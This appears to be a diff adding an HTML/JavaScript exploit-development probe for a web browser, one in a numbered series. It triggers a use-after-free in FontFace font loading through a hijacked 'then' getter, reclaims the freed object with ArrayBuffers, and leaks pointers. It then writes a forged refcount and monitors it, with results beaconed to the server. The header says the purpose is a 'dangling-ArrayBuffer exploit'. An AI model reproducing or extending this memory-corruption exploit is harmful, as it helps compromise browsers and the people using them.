@@ -1,0 +1,210 @@
+<!--
+  p568: Refcount decrement monitor
+
+  p567 proved rc=2 survives.  This probe sets rc=100 in the template and polls
+  the reclaimed buffer every 100ms for 3 seconds to see if/when the engine
+  decrements the refcount.  The decrement count and timing tell us how to
+  set up the dangling-ArrayBuffer exploit.
+
+  Stage 1: leak p58/p68
+  Stage 2: template {rc=100, p58, p68=0}  (p68 null is safe per p567)
+  Poll:    read +0x00 every 100ms, beacon each change
+
+  CRASH_CLASS: LOW — same template pattern as p567 T4
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p568 refcount monitor</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+
+var K = 4, SIZE = 192, styleEl = null, firedHere = false;
+var stageNum = 0, leaked = {p58: null, p68: null};
+var monitorBuf = null;
+
+function hex8be(v, off) {
+  var s = '';
+  for (var i = 7; i >= 0; i--) s += ('0' + v[off + i].toString(16)).slice(-2);
+  return s;
+}
+
+function grab(v, off) {
+  var a = [];
+  for (var i = 0; i < 8; i++) a.push(v[off + i]);
+  return a;
+}
+
+function writeLE8(v, off, bytes) {
+  for (var i = 0; i < 8; i++) v[off + i] = bytes[i];
+}
+
+function writeLE4(v, off, val) {
+  v[off]   =  val        & 0xFF;
+  v[off+1] = (val >>  8) & 0xFF;
+  v[off+2] = (val >> 16) & 0xFF;
+  v[off+3] = (val >> 24) & 0xFF;
+}
+
+function readLE4(v, off) {
+  return (v[off] | (v[off+1] << 8) | (v[off+2] << 16) | ((v[off+3] << 24) >>> 0)) >>> 0;
+}
+
+function setupFace(idx) {
+  var name = 'f' + idx;
+  var css = "@font-face { font-family: s" + idx + "; src: local(Arial); unicode-range: U+004" + (2 + idx).toString(16) + "; }";
+  styleEl = document.createElement('style');
+  styleEl.textContent = css;
+  document.head.appendChild(styleEl);
+  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive.push(A);
+}
+
+function installGetter(template) {
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) {
+        styleEl.remove();
+        styleEl.textContent = '';
+      }
+      try { document.fonts.delete(this); } catch(e) {}
+      styleEl = null;
+      document.body.offsetHeight;
+
+      window.__map = [];
+      for (var k = 0; k < K; k++) {
+        var ab = new ArrayBuffer(SIZE);
+        var v = new Uint8Array(ab);
+        if (template) {
+          writeLE4(v, 0x00, template.rc);
+          if (template.p58) writeLE8(v, 0x58, template.p58);
+          if (template.p68) writeLE8(v, 0x68, template.p68);
+        }
+        window.__map.push(v);
+      }
+      try { document.fonts.check('1em s' + stageNum); } catch(e) {}
+      return undefined;
+    },
+    set: function() {}
+  });
+}
+
+function scanHit() {
+  var m = window.__map || [];
+  for (var i = 0; i < m.length; i++) {
+    if (m[i][0x58] !== 0 || m[i][0x59] !== 0 || m[i][0x5A] !== 0 || m[i][0x5B] !== 0) {
+      return { hit: i, v: m[i] };
+    }
+  }
+  return null;
+}
+
+function runStage1() {
+  stageNum = 0;
+  setupFace(0);
+  installGetter(null);
+  b('P568-SETUP');
+  document.fonts.load('1em f0, s0', 'AB').then(
+    function() { b('P568-S1-RESOLVED'); },
+    function() { b('P568-S1-REJECTED'); }
+  );
+  setTimeout(afterStage1, 150);
+}
+
+function afterStage1() {
+  var r = scanHit();
+  if (!r) { b('P568-S1-NOHIT'); return; }
+  leaked.p58 = grab(r.v, 0x58);
+  leaked.p68 = grab(r.v, 0x68);
+
+  b('P568-S1-b' + r.hit
+    + '-p58_' + hex8be(r.v, 0x58)
+    + '-p68_' + hex8be(r.v, 0x68)
+    + '-rc_' + readLE4(r.v, 0));
+
+  runStage2();
+}
+
+function runStage2() {
+  stageNum = 1;
+  setupFace(1);
+  installGetter({ rc: 100, p58: leaked.p58, p68: null });
+
+  b('P568-S2-RC100');
+  document.fonts.load('1em f1, s1', 'AB').then(
+    function() {
+      b('P568-S2-SURVIVED');
+      findMonitorBuf();
+      startMonitor();
+    },
+    function() {
+      b('P568-S2-REJECTED');
+      findMonitorBuf();
+      startMonitor();
+    }
+  );
+}
+
+function findMonitorBuf() {
+  var m = window.__map || [];
+  for (var i = 0; i < m.length; i++) {
+    var rc = readLE4(m[i], 0);
+    if (rc >= 90 && rc <= 100) {
+      monitorBuf = m[i];
+      b('P568-MONITOR-b' + i + '-rc_' + rc);
+      return;
+    }
+  }
+  for (var i = 0; i < m.length; i++) {
+    if (m[i][0x58] !== 0 || m[i][0x59] !== 0) {
+      monitorBuf = m[i];
+      b('P568-MONITOR-FALLBACK-b' + i + '-rc_' + readLE4(m[i], 0));
+      return;
+    }
+  }
+  b('P568-MONITOR-NONE');
+}
+
+var pollCount = 0, lastRc = -1, maxPolls = 30;
+
+function startMonitor() {
+  if (!monitorBuf) { b('P568-POLL-NOBUF'); return; }
+  pollCount = 0;
+  lastRc = readLE4(monitorBuf, 0);
+  b('P568-POLL-START-rc_' + lastRc);
+  setTimeout(pollRc, 100);
+}
+
+function pollRc() {
+  if (!monitorBuf) return;
+  pollCount++;
+  var rc = readLE4(monitorBuf, 0);
+
+  if (rc !== lastRc) {
+    b('P568-RC-CHANGE-t' + pollCount + '-was_' + lastRc + '-now_' + rc);
+    lastRc = rc;
+  }
+
+  if (pollCount >= maxPolls) {
+    var p58now = hex8be(monitorBuf, 0x58);
+    var dumpHead = '';
+    for (var i = 0; i < 16; i++) dumpHead += ('0' + monitorBuf[i].toString(16)).slice(-2);
+    b('P568-POLL-END-rc_' + rc + '-p58_' + p58now + '-head_' + dumpHead + '-polls_' + pollCount);
+    b('P568-DONE');
+    return;
+  }
+
+  setTimeout(pollRc, 100);
+}
+
+function start() {
+  window.__alive = [];
+  runStage1();
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(start, 0);
+else document.addEventListener('DOMContentLoaded', start);
+</script></head><body><p>p568 refcount monitor</p></body></html>
